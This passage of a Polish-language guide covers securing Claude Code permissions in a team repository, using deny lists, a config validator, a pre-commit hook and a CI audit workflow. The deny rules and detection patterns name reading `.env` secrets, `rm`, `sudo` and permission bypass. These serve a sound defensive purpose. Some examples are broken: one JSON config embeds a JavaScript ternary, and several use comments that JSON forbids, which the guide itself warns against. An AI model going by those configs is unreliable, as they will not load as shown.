    *   *Production:* Tryb `plan` (tylko do odczytu/analizy logów) lub `read-only`. Żadnego edytowania plików na produkcji!.
*   **Zagadnienie:** Team settings i code review.
    *   *Rozwiązanie:* Plik `.claude/settings.json` powinien być w repozytorium. Każda zmiana uprawnień (np. dodanie nowej dozwolonej komendy) musi przejść przez Pull Request i Code Review innego człowieka. To zapobiega "tylnym furtkom" wprowadzanym przez AI.
*   **Ciekawy pomysł (Tool Audit):** Użyj narzędzia takiego jak `cc-safe`, aby okresowo skanować pliki konfiguracyjne projektu w poszukiwaniu ryzykownych uprawnień (np. przypadkowo dozwolonego `rm -rf`).

**ROZSZERZENIA PRAKTYCZNE:**

*   **Przykład: Hierarchia konfiguracji (global → team → project → local)**
    ```bash
    # Struktura konfiguracji
    ~/.claude/settings.json              # Globalne ustawienia użytkownika
    /project/.claude/team-settings.json  # Ustawienia zespołu (w repo)
    /project/.claude/settings.json       # Ustawienia projektu (w repo)
    /project/.claude/local.json          # Lokalne override'y (gitignore)
    ```

    *   **Przykładowa zawartość:**
    ```json
    // team-settings.json (w repozytorium, wspólne dla zespołu)
    {
      "permissions": {
        "deny": [
          "Read(**/.env*)",
          "Bash(rm:*)",
          "Bash(sudo:*)"
        ],
        "ask": [
          "Bash(git push*)",
          "Edit(package.json)"
        ]
      }
    }

    // local.json (gitignore, osobiste preferencje)
    {
      "extends": ".claude/team-settings.json",
      "permissions": {
        "allow": [
          "Bash(code:*)",  // Osobisty editor
          "Read(/Users/me/personal-scripts/**)"
        ]
      }
    }
    ```

*   **Pro-tip: Automatyczna walidacja konfiguracji w pre-commit**
    *   Stwórz skrypt `.claude/validate-config.js`:
    ```javascript
    #!/usr/bin/env node
    const fs = require('fs');
    const config = JSON.parse(fs.readFileSync('.claude/settings.json', 'utf8'));

    // Lista niebezpiecznych patterns
    const dangerousPatterns = [
      /Bash\(\*\)/,                    // Wszystkie komendy
      /Read\(\*\*\/\*\)/,              // Wszystkie pliki
      /deny.*\[\s*\]/,                 // Pusta deny list
      /bypassPermissions.*true/i,      // Bypass włączony
      /sandbox.*false/i                 // Sandbox wyłączony
    ];

    const configStr = JSON.stringify(config);
    const violations = [];

    dangerousPatterns.forEach(pattern => {
      if (pattern.test(configStr)) {
        violations.push(`Dangerous pattern detected: ${pattern.source}`);
      }
    });

    if (violations.length > 0) {
      console.error('❌ Configuration validation FAILED:');
      violations.forEach(v => console.error(`  - ${v}`));
      process.exit(1);
    }

    console.log('✓ Configuration is safe');
    ```

    *   Pre-commit hook:
    ```bash
    # .git/hooks/pre-commit
    #!/bin/bash
    if git diff --cached --name-only | grep -q "\.claude/settings.json"; then
      echo "Validating Claude configuration..."
      node .claude/validate-config.js || exit 1
    fi
    ```

*   **Typowy błąd: Brak separacji dev/staging/prod**
    *   Problem: Ta sama konfiguracja Claude używana lokalnie i na serwerach produkcyjnych.
    *   **Rozwiązanie:** Używaj zmiennych środowiskowych:
    ```json
    {
      "permissions": {
        "mode": "${CLAUDE_MODE:-normal}",  // Default: normal
        "allow": "${CLAUDE_ENV}" === "production" ? [] : [
          "Bash(npm test)",
          "Edit(src/**)"
        ]
      }
    }
    ```
    *   W produkcji: `export CLAUDE_MODE=plan CLAUDE_ENV=production`

*   **Edge case: Konflikt uprawnień między członkami zespołu**
    *   Scenariusz: Junior dev chce `"allow": ["Bash(*)"]`, senior dev blokuje w code review.
    *   **Mediacja:** Stwórz profile ról w osobnych plikach:
    ```bash
    .claude/
    ├── roles/
    │   ├── junior.json      # Ograniczone uprawnienia
    │   ├── senior.json      # Pełne uprawnienia dev
    │   └── readonly.json    # Tylko analiza
    └── settings.json
    ```
    *   W `settings.json`:
    ```json
    {
      "extends": ".claude/roles/${CLAUDE_ROLE:-junior}.json"
    }
    ```
    *   Każdy dev ustawia `export CLAUDE_ROLE=senior` w swoim `.bashrc`

*   **Integracja: Automatyczne audyty bezpieczeństwa**
    *   Użyj GitHub Actions do skanowania konfiguracji:
    ```yaml
    name: Claude Config Audit
    on:
      pull_request:
        paths:
          - '.claude/**'

    jobs:
      audit:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v3

          - name: Audit Claude permissions
            run: |
              # Sprawdź czy nie ma bypass mode
              if grep -r "bypassPermissions" .claude/; then
                echo "❌ BLOCKED: Bypass mode detected in config"
                exit 1
              fi

              # Sprawdź czy deny list nie jest pusta
              if ! grep -r "deny" .claude/ | grep -v "deny.*\[\s*\]"; then
                echo "⚠️  WARNING: No deny rules found"
              fi

              # Sprawdź czy sandbox jest włączony
              if grep -r '"sandbox".*false' .claude/; then
                echo "❌ BLOCKED: Sandbox disabled"
                exit 1
              fi

          - name: Comment PR with audit results
            uses: actions/github-script@v6
            with:
              script: |
                github.rest.issues.createComment({
                  issue_number: context.issue.number,
                  owner: context.repo.owner,
                  repo: context.repo.repo,
                  body: '✅ Claude configuration passed security audit'
                })
    ```

*   **Troubleshooting: "Settings file not loading"**
    *   **Objawy:** Zmiany w `settings.json` nie są respektowane, Claude używa domyślnych ustawień.
    *   **Debug checklist:**
    ```bash
    # 1. Sprawdź czy plik jest w prawidłowej lokalizacji
    ls -la .claude/settings.json

    # 2. Waliduj JSON syntax
    cat .claude/settings.json | jq .
    # Jeśli błąd: napraw JSON

    # 3. Sprawdź uprawnienia do odczytu
    stat -c "%a %n" .claude/settings.json
    # Powinno być: 644 lub 664

    # 4. Sprawdź czy Claude widzi plik
    claude --show-config
    # Powinno wyświetlić zmergowaną konfigurację

    # 5. Wyczyść cache
    rm -rf ~/.claude/cache
    claude --reload-config
    ```

    *   **Częste przyczyny:**
        - Komentarze w JSON (JSON nie wspiera komentarzy!)
        - BOM (Byte Order Mark) na początku pliku
        - Encoding inny niż UTF-8
        - Symlink do settings.json wskazujący na nieistniejący plik